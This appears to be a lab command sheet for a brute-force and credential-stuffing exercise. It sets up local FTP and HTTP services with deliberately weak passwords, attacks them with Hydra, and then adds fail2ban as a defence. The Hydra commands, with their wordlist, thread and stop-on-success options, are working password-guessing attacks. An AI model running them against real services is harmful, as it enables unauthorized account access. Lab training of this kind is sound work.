# =========================================
# Lab 12 – Brute-Force & Credential Stuffing
# =========================================

# -----------------------------
# Lab Environment Verification
# -----------------------------

cat /etc/os-release
pwd
hydra -h | head -5
uname -a
whoami

# -----------------------------
# System Update
# -----------------------------

sudo apt update

# -----------------------------
# Install Required Services
# -----------------------------

sudo apt install -y vsftpd apache2 apache2-utils curl

# -----------------------------
# Start Services
# -----------------------------

sudo systemctl start vsftpd
sudo systemctl start apache2

# -----------------------------
# Enable Services
# -----------------------------

sudo systemctl enable vsftpd
sudo systemctl enable apache2

# -----------------------------
# Verify Listening Ports
# -----------------------------

sudo ss -tlnp | grep -E ':(21|80)'

# -----------------------------
# Create FTP Users
# -----------------------------

sudo useradd -m testuser1
sudo useradd -m admin

# Set Weak Passwords
echo 'testuser1:password123' | sudo chpasswd
echo 'admin:admin' | sudo chpasswd

# Verify Users
grep -E 'testuser1|admin' /etc/passwd

# -----------------------------
# Configure HTTP Basic Auth
# -----------------------------

sudo mkdir -p /var/www/html/protected
echo "<h1>Protected Area</h1>" | sudo tee /var/www/html/protected/index.html

sudo htpasswd -cb /etc/apache2/.htpasswd webuser password
sudo htpasswd -b /etc/apache2/.htpasswd admin admin123

sudo nano /etc/apache2/sites-available/000-default.conf
sudo systemctl restart apache2

# -----------------------------
# Create Wordlists
# -----------------------------

nano userlist.txt
cat userlist.txt

nano passlist.txt
cat passlist.txt

# -----------------------------
# Hydra Help
# -----------------------------

hydra -h

# -----------------------------
# Single Credential Testing (FTP)
# -----------------------------

hydra -l testuser1 -p password123 127.0.0.1 ftp

# -----------------------------
# Admin Against Password List (Verbose)
# -----------------------------

hydra -l admin -P passlist.txt 127.0.0.1 ftp -v

# -----------------------------
# Full FTP Brute-Force
# -----------------------------

hydra -L userlist.txt -P passlist.txt -v -f -o ftp_results.txt 127.0.0.1 ftp

cat ftp_results.txt

# -----------------------------
# HTTP Basic Auth Brute-Force
# -----------------------------

hydra -L userlist.txt -P passlist.txt -f -o http_results.txt 127.0.0.1 http-get /protected/

cat http_results.txt

# -----------------------------
# Advanced Hydra Options
# -----------------------------

# Multiple Threads
hydra -L userlist.txt -P passlist.txt -t 16 127.0.0.1 ftp

# Add Delay
hydra -L userlist.txt -P passlist.txt -W 2 127.0.0.1 ftp

# Stop After First Success
hydra -L userlist.txt -P passlist.txt -f 127.0.0.1 ftp

# -----------------------------
# Create Brute-Force Automation Script
# -----------------------------

nano brute_force.sh
chmod +x brute_force.sh
ls -l brute_force.sh

# Execute Script
./brute_force.sh 127.0.0.1 ftp userlist.txt passlist.txt

ls -lh bruteforce_*
cat bruteforce_2026-02-17_14:36:12.log

# -----------------------------
# Credential Stuffing Script
# -----------------------------

nano credential_stuffing.sh
chmod +x credential_stuffing.sh

./credential_stuffing.sh

cat ftp_success.log
cat http_success.log

# -----------------------------
# Analyze Results Script
# -----------------------------

nano analyze_results.sh
chmod +x analyze_results.sh

./analyze_results.sh ftp_results.txt

ls -lh analysis_report.html
head analysis_report.html

# -----------------------------
# Rate Limiting Script
# -----------------------------

chmod +x test_rate_limit.sh
ls -l test_rate_limit.sh

./test_rate_limit.sh ftp 20
./test_rate_limit.sh http 20

# -----------------------------
# Install Fail2Ban
# -----------------------------

sudo apt install -y fail2ban

sudo nano /etc/fail2ban/jail.local

sudo systemctl start fail2ban
sudo systemctl enable fail2ban

sudo fail2ban-client status

# -----------------------------
# Trigger Fail2Ban
# -----------------------------

for i in {1..5}; do hydra -l baduser -p badpass 127.0.0.1 ftp; sleep 1; done

sudo fail2ban-client status vsftpd

# -----------------------------
# Unban IP
# -----------------------------

sudo fail2ban-client set vsftpd unbanip 127.0.0.1

# -----------------------------
# Create Security Report
# -----------------------------

nano security_report.md
